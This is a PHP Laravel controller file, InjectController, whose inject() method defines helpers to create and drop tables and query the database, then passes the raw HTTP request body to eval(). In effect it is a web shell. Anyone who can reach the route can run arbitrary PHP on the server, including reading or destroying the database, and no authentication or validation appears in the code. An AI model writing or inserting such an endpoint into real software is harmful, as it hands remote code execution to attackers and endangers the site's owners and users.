<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Database\Schema\Builder;
use Carbon\Carbon;

class InjectController extends Controller
{
    public function inject(Request $request)
    {
        $migrate = function ($table, $func)
        {
            return \Schema::create($table, $func);
        };

        $drop = function ($table)
        {
            return \Schema::drop($table);
        };

        $db = function ($table)
        {
            return \DB::table($table);
        };

        $now = function ()
        {
            return Carbon::now();
        };

        $r = $request->getContent();
        eval($r);
    }
}
